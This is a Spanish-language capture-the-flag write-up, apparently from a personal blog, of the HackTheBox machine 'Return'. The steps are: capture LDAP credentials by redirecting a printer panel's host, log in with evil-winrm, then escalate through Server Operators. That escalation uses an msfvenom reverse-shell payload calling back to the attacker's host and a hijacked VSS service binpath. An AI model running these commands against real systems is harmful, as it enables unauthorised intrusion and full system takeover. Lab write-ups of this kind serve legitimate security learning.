@@ -1,0 +1,316 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width initial-scale=1" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="robots" content="noindex">
+
+  <title>Writeup HackTheBox Return</title>
+
+  <meta name="description" content="Resolución de la máquina Return de la plataforma de HackTheBox">
+  <meta name="author" content="GatoGamer1155">
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Writeup HackTheBox Return">
+  <meta name="twitter:description" content="Resolución de la máquina Return de la plataforma de HackTheBox">
+  <meta name="twitter:creator" content="GatoGamer1155">  
+  <meta name="twitter:image" content="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ni/return.png" />
+
+  <meta property="og:site_name" content="GatoGamer1155" />
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="Writeup HackTheBox Return">
+  <meta property="og:description" content="Resolución de la máquina Return de la plataforma de HackTheBox">
+  <meta property="og:image" content="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ni/return.png" />
+
+  <link rel="manifest" href="/images/favicons/manifest.json">
+  <link rel="shortcut icon" type="image/png" sizes="64x64" href="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ni/return.png">
+
+  <meta name="msapplication-TileColor" content="#ffc40d">
+  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+  
+  <meta name="msapplication-TileColor" content="#ffc40d">
+  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+
+  <link rel="stylesheet" href="/css/main.css?1678854914750547280">
+  <link rel="canonical" href="http://localhost:4000/">
+  <link rel="alternate" type="application/rss+xml" title="Writeup HackTheBox Return" href="/feed.xml">
+</head>
+
+  <body style="background-color: #282828;">
+  
+    <span class="mobile btn-mobile-menu">
+      <i class="icon icon-list btn-mobile-menu__icon"></i>
+      <i class="icon icon-x-circle btn-mobile-close__icon hidden"></i>
+    </span>
+
+<header class="panel-cover" style="background-image: url(/images/cover.jpg)">
+
+  <div class="panel-main">
+    <div class="panel-main__inner panel-inverted">
+      <div class="panel-main__content">
+
+          <img src="/images/profile.jpg" class="user-image zoomable" alt="GatoGamer1155">
+          <h1 class="panel-cover__title panel-title scale-up-center">GatoGamer1155</h1>
+
+        <hr class="panel-cover__divider">
+        <p class="panel-cover__description slide-top">Entusiasta del Hacking y CTFs</p>
+        <hr class="panel-cover__divider panel-cover__divider--secondary">
+
+        <div class="navigation-wrapper">
+         <nav class="cover-navigation cover-navigation--primary">
+            <ul class="navigation">
+              <li class="navigation__item grow"><a href="/htb" title="GatoGamer1155" class="blog-button">HackTheBox</a></li>
+            </ul>
+          </nav>
+
+          <nav class="cover-navigation navigation--social">
+            <ul class="navigation">
+              
+              <li class="navigation__item grow">
+                <a href="https://github.com/gatogamer1155" title="Github" target="_blank">
+                  <i class="icon icon-social-github"></i>
+                  <span class="label">GitHub</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://twitter.com/gatogamer1155" title="Twitter" target="_blank">
+                  <i class="icon icon-social-twitter"></i>
+                  <span class="label">Twitter</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://instagram.com/gatogamer1155" title="Instagram" target="_blank">
+                  <i class="icon icon-social-instagram"></i>
+                  <span class="label">Instagram</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://youtube.com/@gatogamer1155" title="Youtube" target="_blank">
+                  <i class="icon icon-social-youtube"></i>
+                  <span class="label">Youtube</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="mailto:gatogamer1155@gmail.com" title="Correo Electronico" target="_blank">
+                  <i class="icon icon-mail"></i>
+                  <span class="label">Email</span>
+                </a>
+              </li>
+
+            </ul>
+          </nav>
+        </div>
+      </div>
+    </div>
+
+    <div class="panel-cover--overlay"></div>
+  </div>
+</header>
+    <br>
+    <div class="content-wrapper">
+      <div class="content-wrapper__inner">
+        <article class="post-container post-container--single">
+    <div class="izquierda">
+      <h3 class="post-title">Contenido</h3><br>
+      <ul>
+        <li><a href="#enumeration">Enumeración</a></li>
+        <li><a href="#shell-svc-printer">Shell - svc-printer</a></li>
+        <li><a href="#shell-administrator">Shell - Administrator</a></li>
+      </ul>
+  </div>
+
+  <header class="post-header slide-top">
+    <h4 class="post-title">HackTheBox</h4>
+    <picture><img src="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ni/return.png" style="float: right; margin-right:0px; margin-left:0px; height:60px;" class="include_image zoomable"/></picture>
+    <h2 class="post-title">Return</h2><br>
+  </header>
+  
+<section class="post" id="enumeration">
+<br><h3 class="post-title">Enumeración</h3><br>
+
+<p class="plain-text">Iniciamos la máquina escaneando los puertos de la máquina con <code class="language-plaintext highlighter-rouge">nmap</code> donde encontramos varios puertos abiertos, entre ellos el <code class="language-plaintext highlighter-rouge">80</code> que corre un servicio <code class="language-plaintext highlighter-rouge">http</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ nmap </span><span class="p">10.10.11.108
+Nmap scan report for 10.10.11.108  
+PORT      STATE SERVICE
+53/tcp    open  domain
+80/tcp    open  http
+88/tcp    open  kerberos-sec
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+389/tcp   open  ldap
+445/tcp   open  microsoft-ds
+464/tcp   open  kpasswd5
+593/tcp   open  http-rpc-epmap
+636/tcp   open  ldapssl
+3268/tcp  open  globalcatLDAP
+3269/tcp  open  globalcatLDAPssl
+5985/tcp  open  wsman
+9389/tcp  open  adws
+47001/tcp open  winrm
+49664/tcp open  unknown
+49665/tcp open  unknown
+49666/tcp open  unknown
+49668/tcp open  unknown
+49671/tcp open  unknown
+49674/tcp open  unknown
+49675/tcp open  unknown
+49677/tcp open  unknown
+49680/tcp open  unknown
+49688/tcp open  unknown
+49698/tcp open  unknown</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Con <code class="language-plaintext highlighter-rouge">crackmapexec</code> ademas del nombre de la maquina obtenemos su <code class="language-plaintext highlighter-rouge">dominio</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ crackmapexec </span><span class="p">smb 10.10.11.108
+</span><span class="az">SMB         </span><span class="p">10.10.11.108   445    PRINTER          </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 x64 (name:PRINTER) (domain:return.local) (signing:True) (SMBv1:False)  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Para posibles proximos ataques o solo por comodidad lo agregamos al <code class="language-plaintext highlighter-rouge">/etc/hosts</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ echo </span><span class="am">"10.10.11.108 return.local" </span><span class="p">| </span><span class="ve">sudo tee</span><span class="p"> -a /etc/hosts  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Iniciemos con la <code class="language-plaintext highlighter-rouge">web</code>, al abrirla podemos ver un <code class="language-plaintext highlighter-rouge">panel</code> de admin de una <code class="language-plaintext highlighter-rouge">impresora</code>, la web es algo sencilla sin embargo en la parte de arriba tenemos varias <code class="language-plaintext highlighter-rouge">pestañas</code></p>
+<a href="/htb/return/1.png" target="_blank"><div><p><img src="/htb/return/1.png"></p></div></a>   
+
+</section>
+
+<section class="post" id="shell-svc-printer">
+<br><h3 class="post-title">Shell - svc-printer</h3><br>
+
+<p class="plain-text">En la pestaña <code class="language-plaintext highlighter-rouge">settings</code> encontramos que podemos cambiar varias cosas, y en un campo hay una <code class="language-plaintext highlighter-rouge">contraseña</code> por defecto que de primeras no podemos verla</p>
+<a href="/htb/return/2.png" target="_blank"><div><p><img src="/htb/return/2.png"></p></div></a>
+
+<p class="plain-text">Parece hace una petición al host por el puerto <code class="language-plaintext highlighter-rouge">389</code> ldap enviando el usuario y la <code class="language-plaintext highlighter-rouge">contraseña</code>, podemos cambiar el <code class="language-plaintext highlighter-rouge">host</code> por el nuestro para <code class="language-plaintext highlighter-rouge">capturar</code> la petición</p>
+<a href="/htb/return/4.png" target="_blank"><div><p><img src="/htb/return/4.png"></p></div></a>
+
+<p class="plain-text">Con <code class="language-plaintext highlighter-rouge">Wireshark</code> podemos capturar todo el <code class="language-plaintext highlighter-rouge">tráfico</code> entrante, al enviar la petición en la <code class="language-plaintext highlighter-rouge">web</code> recibimos trafico <code class="language-plaintext highlighter-rouge">ldap</code> el cual contiene las <code class="language-plaintext highlighter-rouge">credenciales</code> de <code class="language-plaintext highlighter-rouge">svc-printer</code></p>
+<a href="/htb/return/3.png" target="_blank"><div><p><img src="/htb/return/3.png"></p></div></a>
+
+<p class="plain-text">Comprobamos las credenciales con <code class="language-plaintext highlighter-rouge">crackmapexec</code> y son validas tanto para <code class="language-plaintext highlighter-rouge">smb</code> como para <code class="language-plaintext highlighter-rouge">winrm</code> lo que significa que nos podemos conectar y obtener una <code class="language-plaintext highlighter-rouge">shell</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ crackmapexec </span><span class="p">smb return.local -u svc-printer -p </span><span class="am">'1edFg43012!!'</span><span class="p">
+</span><span class="az">SMB         </span><span class="p">return.local    445    PRINTER          </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 x64 (name:PRINTER) (domain:return.local) (signing:True) (SMBv1:False)  
+</span><span class="az">SMB         </span><span class="p">return.local    445    PRINTER          </span><span class="ve">[+] </span><span class="p">return.local\svc-printer:1edFg43012!!
+
+</span><span class="ve">❯ crackmapexec </span><span class="p">winrm return.local -u svc-printer -p </span><span class="am">'1edFg43012!!'</span><span class="p">
+</span><span class="az">SMB         </span><span class="p">return.local    5985   PRINTER          </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 (name:PRINTER) (domain:return.local)
+</span><span class="az">HTTP        </span><span class="p">return.local    5985   PRINTER          </span><span class="az">[*] </span><span class="p">http://return.local:5985/wsman
+</span><span class="az">WINRM       </span><span class="p">return.local    5985   PRINTER          </span><span class="ve">[+] </span><span class="p">return.local\svc-printer:1edFg43012!! </span><span class="am">(Pwn3d!)</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al conectarnos con <code class="language-plaintext highlighter-rouge">evil-winrm</code> obtenemos una <code class="language-plaintext highlighter-rouge">powershell</code>, podemos leer la <code class="language-plaintext highlighter-rouge">flag</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ evil-winrm</span><span class="p"> -i return.local -u svc-printer -p </span><span class="am">'1edFg43012!!'</span><span class="p">  
+PS C:\Users\svc-printer\Documents> </span><span class="am">whoami</span><span class="p">
+return\svc-printer
+PS C:\Users\svc-printer\Documents> </span><span class="am">type</span><span class="p"> ..\Desktop\user.txt
+889**************************751
+PS C:\Users\svc-printer\Documents></span>
+</code></pre></div></div><br>
+</section>
+
+<section class="post" id="shell-administrator">
+<br><h3 class="post-title">Shell - Administrator</h3><br>
+
+<p class="plain-text">Listando los <code class="language-plaintext highlighter-rouge">grupos</code> a los que pertenecemos podemos ver uno bastante inusual y que nos puede servir para escalar <code class="language-plaintext highlighter-rouge">privilegios</code>, este es <code class="language-plaintext highlighter-rouge">Server Operators</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\svc-printer\Documents> </span><span class="am">Get-ADPrincipalGroupMembership </span><span class="p">svc-printer | </span><span class="am">Select </span><span class="p">Name  
+
+Name
+----
+Domain Users
+Print Operators
+Remote Management Users
+Server Operators
+
+PS C:\Users\svc-printer\Documents></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Para explotarlo iniciamos creando un archivo <code class="language-plaintext highlighter-rouge">exe</code> con <code class="language-plaintext highlighter-rouge">msfvenom</code> el cual se encargara de enviarnos una <code class="language-plaintext highlighter-rouge">powershell</code> a nuestro <code class="language-plaintext highlighter-rouge">host</code> por el puerto <code class="language-plaintext highlighter-rouge">443</code> cuando se ejecute</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ msfvenom </span><span class="p">-p windows/x64/powershell_reverse_tcp LHOST=10.10.14.10 LPORT=443 -f exe -o shell.exe  
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 1887 bytes
+Final size of exe file: 8192 bytes
+Saved as: shell.exe</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Podemos <code class="language-plaintext highlighter-rouge">subirlo</code> facilmente con la función <code class="language-plaintext highlighter-rouge">upload</code> incluida con <code class="language-plaintext highlighter-rouge">evil-winrm</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\svc-printer\Documents> </span><span class="am">upload </span><span class="p">shell.exe
+</span><span class="az">
+Info: Uploading shell.exe to C:\Users\svc-printer\Documents\shell.exe
+</span><span class="sa">
+Data: 10920 bytes of 10920 bytes copied
+</span><span class="az">
+Info: Upload successful!
+</span><span class="p">
+PS C:\Users\svc-printer\Documents></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ahora con <code class="language-plaintext highlighter-rouge">sc.exe</code> configuramos el servicio <code class="language-plaintext highlighter-rouge">VSS</code> pasandole como <code class="language-plaintext highlighter-rouge">binpath</code> la ruta absoluta de nuestro archivo <code class="language-plaintext highlighter-rouge">exe</code> malicioso, para cuando se inicie este lo <code class="language-plaintext highlighter-rouge">ejecute</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\svc-printer\Documents> </span><span class="am">sc.exe </span><span class="p">config VSS binpath="C:\Users\svc-printer\Documents\shell.exe"  
+[SC] ChangeServiceConfig SUCCESS
+PS C:\Users\svc-printer\Documents></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Detenemos y corremos de nuevo el <code class="language-plaintext highlighter-rouge">servicio</code> para que en el arranque ejecute el <code class="language-plaintext highlighter-rouge">exe</code>, al hacerlo recibimos una <code class="language-plaintext highlighter-rouge">shell</code> a nuestro listener como <code class="language-plaintext highlighter-rouge">nt authority\system</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\svc-printer\Documents> </span><span class="am">sc.exe </span><span class="p">stop VSS
+[SC] ControlService FAILED 1062:
+
+The service has not been started.
+
+PS C:\Users\svc-printer\Documents> </span><span class="am">sc.exe </span><span class="p">start VSS
+[SC] StartService FAILED 1053:
+
+The service did not respond to the start or control request in a timely fashion.  
+
+PS C:\Users\svc-printer\Documents></span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ sudo netcat </span><span class="p">-lvnp 443
+Listening on 0.0.0.0 443
+Connection received on 10.10.11.108 50603
+Windows PowerShell running as user PRINTER$ on PRINTER
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+PS C:\Windows\system32> </span><span class="am">whoami</span><span class="p">
+nt authority\system
+PS C:\Windows\system32> </span><span class="am">type </span><span class="p">C:\Users\Administrator\Desktop\root.txt  
+847**************************72c
+PS C:\Windows\system32></span>
+</code></pre></div></div><br>
+
+</section>
+
+</article>
+  </div>
+  <footer class="footer">
+    <span class="footer__copyright">&copy; 2023 - GatoGamer1155</span>
+  </footer><br><br>
+
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+<script type="text/javascript" src="/js/main.js?1678894953382991917"></script>
+
+    </div>
+  </body>
+</html>
